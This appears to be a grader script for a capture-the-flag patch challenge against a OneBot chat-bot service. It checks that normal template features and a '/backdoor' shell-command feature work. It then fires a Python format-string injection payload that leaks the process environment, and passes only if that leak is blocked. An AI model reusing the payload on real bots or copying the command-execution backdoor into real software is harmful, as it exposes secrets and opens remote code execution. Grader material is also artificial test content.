import json
import logging
import random
import time

import websockets.sync.client as client

logger = logging.getLogger(__name__)


class Checker:
    def __init__(self, host: str, port: int) -> None:
        self.websocket_url = f"ws://{host}:{port}/onebot/v11/ws"
        self.ws = client.connect(
            self.websocket_url,
            additional_headers={
                "X-Self-ID": "100002",
            },
        )

    def _expect_msg(self, msg: str | None = None) -> None:
        data = json.loads(self.ws.recv(timeout=5))
        all_text = "".join(
            [
                i["data"]["text"]
                for i in data["params"]["message"]
                if i["type"] == "text"
            ]
        )
        if msg and msg not in all_text:
            raise ValueError(f"Expected message {msg!r}, but got {all_text!r}")
        logger.debug("Received message: %r", all_text)
        self.ws.send(
            json.dumps(
                {
                    "echo": data["echo"],
                    "status": "ok",
                    "retcode": 0,
                    "data": {"message_id": random.randint(10000, 99999)},
                }
            )
        )
        time.sleep(1)

    def _send_data(self, data: dict) -> None:
        self.ws.send(json.dumps(data))

    def check_features(self):
        self._send_data(
            {
                "time": 1716208792,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 332481971048,
                "group_id": 114514,
                "message_id": 10190,
                "message": [{"type": "text", "data": {"text": "/修改模板"}}],
                "raw_message": "/修改模板",
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 332481971048,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        self._expect_msg()
        self._send_data(
            {
                "time": 1716208799,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 332481971048,
                "group_id": 114514,
                "message_id": 10192,
                "message": [{"type": "text", "data": {"text": "addition_success"}}],
                "raw_message": "addition_success",
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 332481971048,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        self._expect_msg()
        self._send_data(
            {
                "time": 1716208801,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 332481971048,
                "group_id": 114514,
                "message_id": 10194,
                "message": [{"type": "text", "data": {"text": "haole"}}],
                "raw_message": "haole",
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 332481971048,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        self._expect_msg("haole")
        self._send_data(
            {
                "time": 1716208806,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 332481971048,
                "group_id": 114514,
                "message_id": 10196,
                "message": [{"type": "text", "data": {"text": "/上分"}}],
                "raw_message": "/上分",
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 332481971048,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        self._expect_msg("haole")

        logger.info("Features are working fine!")

    def check_backdoor(self):
        self._send_data(
            {
                "time": 1716208261,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 332481971048,
                "group_id": 114514,
                "message_id": 10177,
                "message": [{"type": "text", "data": {"text": "/backdoor"}}],
                "raw_message": "/backdoor",
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 332481971048,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        self._expect_msg()
        self._send_data(
            {
                "time": 1716208250,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 332481971048,
                "group_id": 114514,
                "message_id": 10174,
                "message": [{"type": "text", "data": {"text": "uname -a"}}],
                "raw_message": "uname -a",
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 332481971048,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        self._expect_msg("Linux")

        logger.info("Backdoor is working fine!")

    def check(self):
        try:
            self.check_features()
            self.check_backdoor()
        except Exception as e:
            logger.warning("Failed to check: %s", e)
            return False
        else:
            return True
        finally:
            self.ws.close()


class Exploit:
    def __init__(self, host: str, port: int) -> None:
        self.websocket_url = f"ws://{host}:{port}/onebot/v11/ws"
        self.ws = client.connect(
            self.websocket_url,
            additional_headers={
                "X-Self-ID": "100002",
            },
        )

    def _send_data(self, data: dict) -> None:
        self.ws.send(json.dumps(data))

    def _expect_msg(self, msg: str | None = None):
        data = json.loads(self.ws.recv(timeout=5))
        all_text = "".join(
            [
                i["data"]["text"]
                for i in data["params"]["message"]
                if i["type"] == "text"
            ]
        )
        if msg and msg not in all_text:
            raise ValueError(f"Expected message {msg!r}, but got {all_text!r}")
        logger.debug("Received message: %r", all_text)
        self.ws.send(
            json.dumps(
                {
                    "echo": data["echo"],
                    "status": "ok",
                    "retcode": 0,
                    "data": {"message_id": random.randint(10000, 99999)},
                }
            )
        )
        time.sleep(1)
        return all_text

    def _exploit(self):
        self._send_data(
            {
                "time": 1716208750,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 33248197104,
                "group_id": 114514,
                "message_id": 10181,
                "message": [{"type": "text", "data": {"text": "/修改模板"}}],
                "raw_message": "/修改模板",
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 33248197104,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        self._expect_msg()
        self._send_data(
            {
                "time": 1716208760,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 33248197104,
                "group_id": 114514,
                "message_id": 10185,
                "message": [{"type": "text", "data": {"text": "addition_success"}}],
                "raw_message": "addition_success",
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 33248197104,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        self._expect_msg()
        self._send_data(
            {
                "time": 1716208763,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 33248197104,
                "group_id": 114514,
                "message_id": 10187,
                "message": [
                    {
                        "type": "text",
                        "data": {
                            "text": "{user_at.__len__.__globals__[overload].__globals__[contextlib].asynccontextmanager.__globals__[os].environ!r}"  # noqa: E501
                        },
                    }
                ],
                "raw_message": "{user_at.__len__.__globals__[overload].__globals__[contextlib].asynccontextmanager.__globals__[os].environ!r}",  # noqa: E501
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 33248197104,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        self._expect_msg("{user_at")
        self._send_data(
            {
                "time": 1716211546,
                "self_id": 100001,
                "post_type": "message",
                "message_type": "group",
                "sub_type": "normal",
                "user_id": 33248197104,
                "group_id": 114514,
                "message_id": 10210,
                "message": [{"type": "text", "data": {"text": "/上分"}}],
                "raw_message": "/上分",
                "font": 0,
                "anonymous": None,
                "sender": {
                    "user_id": 33248197104,
                    "nickname": "admin",
                    "sex": "unknown",
                    "age": 0,
                    "area": "",
                    "card": "",
                    "role": "owner",
                    "level": "0",
                    "title": "",
                },
            }
        )
        msg = self._expect_msg()
        return any(
            keyword in msg for keyword in ["SUPERUSER", "SHELL", "PYTHON_VERSION"]
        )

    def exploit(self):
        try:
            result = self._exploit()
        except Exception as e:
            logger.warning("Failed to exploit: %s", e)
            return False
        else:
            return result
        finally:
            self.ws.close()


logging.basicConfig(level=logging.CRITICAL)


if __name__ == "__main__":
    host = "127.0.0.1"
    port = 8080

    checker = Checker(host, port)
    service_online = checker.check()
    exploitable = False

    if service_online:
        exp = Exploit(host, port)
        exploitable = exp.exploit()

    print(
        json.dumps(
            {
                "correct": service_online and not exploitable,
                "msg": (
                    "服务异常"
                    if not service_online
                    else ("评测正确" if not exploitable else "利用成功")
                ),
            },
            ensure_ascii=False,
        )
    )
